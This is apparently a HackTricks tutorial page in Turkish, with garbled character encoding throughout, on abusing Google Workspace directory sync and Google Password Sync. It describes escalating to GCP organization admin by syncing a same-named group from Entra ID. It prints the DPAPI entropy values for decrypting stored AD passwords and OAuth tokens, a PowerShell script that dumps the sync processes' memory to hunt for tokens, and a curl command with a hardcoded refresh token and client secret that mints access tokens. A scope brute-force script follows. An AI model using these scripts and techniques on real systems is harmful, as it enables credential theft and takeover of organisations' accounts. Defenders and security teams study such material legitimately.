* **Active Directory:** Bunu ayarlamak iÃ§in **Google'a Active Directory ortamÄ±nÄ±za eriÅŸim vermeniz** gerekir. Google yalnÄ±zca GCP aÄŸlarÄ±na (**VPC baÄŸlantÄ±larÄ±** aracÄ±lÄ±ÄŸÄ±yla) eriÅŸim saÄŸladÄ±ÄŸÄ± iÃ§in bir baÄŸlantÄ± oluÅŸturmanÄ±z ve ardÄ±ndan AD'nizi bu baÄŸlantÄ±dan, GCP aÄŸÄ±ndaki VM'lerde veya Cloud VPN veya Cloud Interconnect kullanarak eriÅŸilebilir hale getirmeniz gerekir. AyrÄ±ca, dizin Ã¼zerinde okuma eriÅŸimi olan bir hesabÄ±n **kimlik bilgilerini** ve **LDAPS** Ã¼zerinden iletiÅŸim kurmak iÃ§in bir **sertifika** saÄŸlamanÄ±z gerekir.
* **Azure Entra ID:** Bunu yapÄ±landÄ±rmak iÃ§in sadece **Azure'da okuma eriÅŸimi olan bir kullanÄ±cÄ± ile giriÅŸ yapmanÄ±z** gerekir; bu, Google tarafÄ±ndan gÃ¶sterilen bir aÃ§Ä±lÄ±r pencerede yapÄ±lÄ±r ve Google, Entra ID Ã¼zerinde okuma eriÅŸimi olan token'Ä± saklayacaktÄ±r.

DoÄŸru bir ÅŸekilde yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda, her iki seÃ§enek de **kullanÄ±cÄ±larÄ± ve gruplarÄ± Workspace'e senkronize etmeye** olanak tanÄ±r, ancak Workspace'ten AD veya EntraID'ye kullanÄ±cÄ± ve grup yapÄ±landÄ±rmasÄ±na izin vermez.

Bu senkronizasyon sÄ±rasÄ±nda izin verilen diÄŸer seÃ§enekler ÅŸunlardÄ±r:

* Yeni kullanÄ±cÄ±lara giriÅŸ yapmalarÄ± iÃ§in bir e-posta gÃ¶nderin
* E-posta adreslerini Workspace tarafÄ±ndan kullanÄ±lan adresle otomatik olarak deÄŸiÅŸtirin. Yani, Workspace `@hacktricks.xyz` kullanÄ±yorsa ve EntraID kullanÄ±cÄ±larÄ± `@carloshacktricks.onmicrosoft.com` kullanÄ±yorsa, `@hacktricks.xyz` hesapta oluÅŸturulan kullanÄ±cÄ±lar iÃ§in kullanÄ±lacaktÄ±r.
* Senkronize edilecek **kullanÄ±cÄ±larÄ± iÃ§eren gruplarÄ±** seÃ§in.
* Senkronize edilecek ve Workspace'te oluÅŸturulacak **gruplarÄ±** seÃ§in (veya tÃ¼m gruplarÄ± senkronize etmek iÃ§in belirtin).

### AD/EntraID'den -> Google Workspace (& GCP)

Bir AD veya EntraID'yi ele geÃ§irmeyi baÅŸarÄ±rsanÄ±z, Google Workspace ile senkronize edilecek kullanÄ±cÄ±lar ve gruplar Ã¼zerinde tam kontrol sahibi olursunuz.\
Ancak, kullanÄ±cÄ±larÄ±n Workspace'te kullanÄ±yor olabileceÄŸi **ÅŸifrelerin** **aynÄ± olabileceÄŸini veya olmayabileceÄŸini** unutmayÄ±n.

#### KullanÄ±cÄ±lara SaldÄ±rÄ±

Senkronizasyon gerÃ§ekleÅŸtiÄŸinde, **AD'deki tÃ¼m kullanÄ±cÄ±larÄ± veya yalnÄ±zca belirli bir OU'daki kullanÄ±cÄ±larÄ±** veya yalnÄ±zca **EntraID'deki belirli gruplarÄ±n Ã¼yelerini** senkronize edebilir. Bu, senkronize edilmiÅŸ bir kullanÄ±cÄ±ya saldÄ±rmak (veya senkronize edilen yeni bir kullanÄ±cÄ± oluÅŸturmak) iÃ§in Ã¶nce hangi kullanÄ±cÄ±larÄ±n senkronize edildiÄŸini belirlemeniz gerektiÄŸi anlamÄ±na gelir.

* KullanÄ±cÄ±lar **AD veya EntraID'den ÅŸifrelerini yeniden kullanÄ±yor olabilir**, ancak bu, **giriÅŸ yapmak iÃ§in kullanÄ±cÄ±larÄ±n ÅŸifrelerini ele geÃ§irmeniz gerektiÄŸi** anlamÄ±na gelir.
* KullanÄ±cÄ±larÄ±n **maillerine** eriÅŸiminiz varsa, mevcut bir kullanÄ±cÄ±nÄ±n Workspace ÅŸifresini **deÄŸiÅŸtirebilir** veya **yeni bir kullanÄ±cÄ± oluÅŸturabilir**, senkronize edilene kadar bekleyebilir ve hesabÄ± ayarlayabilirsiniz.

Workspace iÃ§inde kullanÄ±cÄ±ya eriÅŸtiÄŸinizde, varsayÄ±lan olarak bazÄ± **izinler verilebilir**.

#### Gruplara SaldÄ±rÄ±

Ã–ncelikle hangi gruplarÄ±n senkronize edildiÄŸini belirlemeniz gerekir. **TÃœM** gruplarÄ±n senkronize edilme olasÄ±lÄ±ÄŸÄ± vardÄ±r (Ã§Ã¼nkÃ¼ Workspace bunu saÄŸlar).

{% hint style="info" %}
Gruplar ve Ã¼yelikler Workspace'e aktarÄ±lsa bile, **kullanÄ±cÄ± senkronizasyonunda senkronize edilmeyen kullanÄ±cÄ±lar** grup senkronizasyonu sÄ±rasÄ±nda oluÅŸturulmayacaktÄ±r, bu gruplarÄ±n herhangi birinin Ã¼yesi olsalar bile.
{% endhint %}

Azure'dan hangi gruplarÄ±n **Workspace veya GCP'de izinler atandÄ±ÄŸÄ±nÄ±** biliyorsanÄ±z, o gruba ele geÃ§irilmiÅŸ bir kullanÄ±cÄ±yÄ± (veya yeni oluÅŸturulmuÅŸ bir kullanÄ±cÄ±yÄ±) ekleyebilir ve bu izinleri alabilirsiniz.

Workspace'teki mevcut ayrÄ±calÄ±klÄ± gruplarÄ± kÃ¶tÃ¼ye kullanmanÄ±n baÅŸka bir yolu vardÄ±r. Ã–rneÄŸin, `gcp-organization-admins@<workspace.email>` grubu genellikle GCP Ã¼zerinde yÃ¼ksek ayrÄ±calÄ±klara sahiptir.

Ã–rneÄŸin, EntraID'den Workspace'e senkronizasyon **ithal edilen nesnenin alanÄ±nÄ±** Workspace'in e-posta adresi ile **deÄŸiÅŸtirecek ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸsa**, bir saldÄ±rganÄ±n EntraID'de `gcp-organization-admins@<entraid.email>` grubunu oluÅŸturmasÄ±, bu gruba bir kullanÄ±cÄ± eklemesi ve tÃ¼m gruplarÄ±n senkronizasyonu gerÃ§ekleÅŸene kadar beklemesi mÃ¼mkÃ¼n olacaktÄ±r.\
**KullanÄ±cÄ±, GCP'de ayrÄ±calÄ±klarÄ± artÄ±rarak `gcp-organization-admins@<workspace.email>` grubuna eklenecektir.**

### Google Workspace'ten -> AD/EntraID

Workspace'in kullanÄ±cÄ±larÄ± ve gruplarÄ± senkronize etmek iÃ§in AD veya EntraID Ã¼zerinde yalnÄ±zca okuma eriÅŸimi olan kimlik bilgilerine ihtiyaÃ§ duyduÄŸunu unutmayÄ±n. Bu nedenle, Google Workspace'i AD veya EntraID'de herhangi bir deÄŸiÅŸiklik yapmak iÃ§in kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼n deÄŸildir. Yani **bu ÅŸu anda mÃ¼mkÃ¼n deÄŸildir**.

Google'Ä±n AD kimlik bilgilerini veya EntraID token'Ä±nÄ± nerede sakladÄ±ÄŸÄ±nÄ± da bilmiyorum ve **senkronizasyonu yeniden yapÄ±landÄ±rarak bunlarÄ± geri alamazsÄ±nÄ±z** (web formunda gÃ¶rÃ¼nmezler, tekrar vermeniz gerekir). Ancak, web Ã¼zerinden mevcut iÅŸlevselliÄŸi **kullanÄ±cÄ±larÄ± ve gruplarÄ± listelemek iÃ§in** kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼n olabilir.

## GPS - Google Åifre Senkronizasyonu

Bu, Google'Ä±n **AD ile kullanÄ±cÄ±larÄ±n ÅŸifrelerini senkronize tutmak iÃ§in** sunduÄŸu ikili dosya ve hizmettir. Bir kullanÄ±cÄ± AD'de ÅŸifresini her deÄŸiÅŸtirdiÄŸinde, bu Google'a ayarlanÄ±r.

`C:\Program Files\Google\Password Sync` dizinine kurulur; burada yapÄ±landÄ±rmak iÃ§in `PasswordSync.exe` ikili dosyasÄ±nÄ± ve Ã§alÄ±ÅŸmaya devam edecek olan `password_sync_service.exe` (hizmet) bulabilirsiniz.

### GPS - YapÄ±landÄ±rma

Bu ikili dosyayÄ± (ve hizmeti) yapÄ±landÄ±rmak iÃ§in **Workspace'te bir SÃ¼per Admin ilkesine eriÅŸim vermeniz** gerekir:

* Google ile **OAuth** aracÄ±lÄ±ÄŸÄ±yla giriÅŸ yapÄ±n ve ardÄ±ndan **kayÄ±t defterinde (ÅŸifreli) bir token saklayacaktÄ±r**
* Sadece GUI'ye sahip Alan Denetleyicilerinde mevcut
* **Workspace kullanÄ±cÄ±larÄ±nÄ± yÃ¶netme** izinlerine sahip **GCP'den bazÄ± Hizmet HesabÄ± kimlik bilgileri (json dosyasÄ±)** vermek
* Bu kimlik bilgileri asla sÃ¼resi dolmadÄ±ÄŸÄ± iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir, Ã§ok kÃ¶tÃ¼ bir fikir
* Workspace Ã¼zerinde bir SA'ya eriÅŸim vermek Ã§ok kÃ¶tÃ¼ bir fikirdir Ã§Ã¼nkÃ¼ SA GCP'de ele geÃ§irilebilir ve Workspace'e geÃ§iÅŸ yapmak mÃ¼mkÃ¼n olacaktÄ±r
* Google, GUI'siz alan denetimleri iÃ§in bunu gerektirir
* Bu kimlik bilgileri de kayÄ±t defterinde saklanÄ±r

AD ile ilgili olarak, mevcut **uygulama baÄŸlamÄ±nÄ±, anonim veya bazÄ± Ã¶zel kimlik bilgilerini** kullanmasÄ±nÄ± belirtmek mÃ¼mkÃ¼ndÃ¼r. Kimlik bilgileri seÃ§eneÄŸi seÃ§ilirse, **kullanÄ±cÄ± adÄ±** bir dosyada **diskte** saklanÄ±r ve **ÅŸifre** **ÅŸifrelenir** ve **kayÄ±t defterinde** saklanÄ±r.

### GPS - Diskten ÅŸifre ve token dÃ¶kme

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) **GPS'yi** tespit edebilir, yapÄ±landÄ±rma hakkÄ±nda bilgi alabilir ve **ÅŸifreyi ve token'Ä± bile ÅŸifreleyebilir**.
{% endhint %}

**`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** dosyasÄ±nda, yapÄ±landÄ±rmanÄ±n bir kÄ±smÄ±nÄ±, yapÄ±landÄ±rÄ±lan AD'nin **`baseDN`** ve kullanÄ±lan kimlik bilgileri olan **`username`** bulmak mÃ¼mkÃ¼ndÃ¼r.

KayÄ±t defterinde **`HKLM\Software\Google\Google Apps Password Sync`** altÄ±nda, **ÅŸifrelenmiÅŸ yenileme token'Ä±** ve AD kullanÄ±cÄ±sÄ± iÃ§in **ÅŸifrelenmiÅŸ ÅŸifre** (varsa) bulunabilir. AyrÄ±ca, bir token yerine bazÄ± **SA kimlik bilgileri** kullanÄ±lÄ±yorsa, bunlarÄ±n da o kayÄ±t defteri adresinde ÅŸifrelenmiÅŸ olarak bulunmasÄ± mÃ¼mkÃ¼ndÃ¼r. Bu kayÄ±t defterindeki **deÄŸerler** yalnÄ±zca **YÃ¶netici** tarafÄ±ndan **eriÅŸilebilir**.

ÅifrelenmiÅŸ **ÅŸifre** (varsa) **`ADPassword`** anahtarÄ±nÄ±n iÃ§indedir ve **`CryptProtectData`** API'si kullanÄ±larak ÅŸifrelenmiÅŸtir. Åifreyi Ã§Ã¶zmek iÃ§in, ÅŸifre senkronizasyonunu yapÄ±landÄ±ran kullanÄ±cÄ± ile aynÄ± kullanÄ±cÄ± olmanÄ±z ve **`CryptUnprotectData`** kullanÄ±rken bu **entropy** deÄŸerini kullanmanÄ±z gerekir: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

ÅifrelenmiÅŸ token (varsa) **`AuthToken`** anahtarÄ±nÄ±n iÃ§indedir ve **`CryptProtectData`** API'si kullanÄ±larak ÅŸifrelenmiÅŸtir. Åifreyi Ã§Ã¶zmek iÃ§in, ÅŸifre senkronizasyonunu yapÄ±landÄ±ran kullanÄ±cÄ± ile aynÄ± kullanÄ±cÄ± olmanÄ±z ve **`CryptUnprotectData`** kullanÄ±rken bu **entropy** deÄŸerini kullanmanÄ±z gerekir: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
AyrÄ±ca, bu deÄŸer **0123456789abcdefghijklmnopqrstv** sÃ¶zlÃ¼ÄŸÃ¼ ile base32hex kullanÄ±larak kodlanmÄ±ÅŸtÄ±r.

Entropy deÄŸerleri, aracÄ± kullanarak bulunmuÅŸtur. AraÃ§, **`CryptUnprotectData`** ve **`CryptProtectData`** Ã§aÄŸrÄ±larÄ±nÄ± izlemek iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r ve ardÄ±ndan `PasswordSync.exe`'yi baÅŸlatmak ve izlemek iÃ§in kullanÄ±lmÄ±ÅŸtÄ±r; bu, yapÄ±landÄ±rÄ±lan ÅŸifreyi ve kimlik doÄŸrulama token'Ä±nÄ± baÅŸta Ã§Ã¶zmekte ve aracÄ±n **her iki durumda kullanÄ±lan entropy deÄŸerlerini** gÃ¶stermektedir:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Bu API'lere yapÄ±lan Ã§aÄŸrÄ±larÄ±n giriÅŸ veya Ã§Ä±kÄ±ÅŸÄ±nda **ÅŸifrelenmiÅŸ** deÄŸerleri gÃ¶rmek de mÃ¼mkÃ¼ndÃ¼r (Winpeas bir noktada Ã§alÄ±ÅŸmayÄ± durdurursa).

EÄŸer Åifre Senkronizasyonu **SA kimlik bilgileri ile yapÄ±landÄ±rÄ±lmÄ±ÅŸsa**, bu da kayÄ±t defterinde **`HKLM\Software\Google\Google Apps Password Sync`** iÃ§inde anahtarlar olarak saklanacaktÄ±r.

### GPS - Bellekten token dÃ¶kme

GCPW ile olduÄŸu gibi, `PasswordSync.exe` ve `password_sync_service.exe` sÃ¼reÃ§lerinin belleÄŸini dÃ¶kme iÅŸlemi yapÄ±labilir ve yenileme ve eriÅŸim token'larÄ±nÄ± bulabilirsiniz (eÄŸer zaten oluÅŸturulmuÅŸlarsa).\
AD yapÄ±landÄ±rÄ±lmÄ±ÅŸ kimlik bilgilerini de bulabileceÄŸinizi dÃ¼ÅŸÃ¼nÃ¼yorum.

<details>

<summary>DÃ¶k <code>PasswordSync.exe</code> ve <code>password_sync_service.exe</code> sÃ¼reÃ§lerini ve token'larÄ± arayÄ±n</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Yenileme token'larÄ±ndan eriÅŸim token'larÄ± oluÅŸturma

Yenileme token'Ä±nÄ± kullanarak, aÅŸaÄŸÄ±daki komutta belirtilen istemci kimliÄŸi ve istemci sÄ±rrÄ± ile eriÅŸim token'larÄ± oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Kapsamlar

{% hint style="info" %}
Bir refresh token'a sahip olsanÄ±z bile, eriÅŸim token'Ä± iÃ§in herhangi bir kapsam talep etmek mÃ¼mkÃ¼n deÄŸildir Ã§Ã¼nkÃ¼ yalnÄ±zca **eriÅŸim token'Ä±nÄ± oluÅŸturduÄŸunuz uygulama tarafÄ±ndan desteklenen kapsamlarÄ± talep edebilirsiniz**.

AyrÄ±ca, refresh token her uygulamada geÃ§erli deÄŸildir.
{% endhint %}

VarsayÄ±lan olarak GPS, kullanÄ±cÄ± olarak her olasÄ± OAuth kapsamÄ±na eriÅŸime sahip olmayacaktÄ±r, bu nedenle aÅŸaÄŸÄ±daki betiÄŸi kullanarak `refresh_token` ile bir `access_token` oluÅŸturmak iÃ§in kullanÄ±labilecek kapsamlarÄ± bulabiliriz:

<details>

<summary>KapsamlarÄ± brute-force yapmak iÃ§in Bash betiÄŸi</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anÄ±nda aldÄ±ÄŸÄ±m Ã§Ä±ktÄ± ÅŸuydu:
```
https://www.googleapis.com/auth/admin.directory.user
```
Hangi, herhangi bir kapsam belirtmediÄŸinizde aldÄ±ÄŸÄ±nÄ±zla aynÄ±dÄ±r.

{% hint style="danger" %}
Bu kapsam ile **mevcut bir kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirerek ayrÄ±calÄ±klarÄ± artÄ±rabilirsiniz**.
{% endhint %}

## Referanslar

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
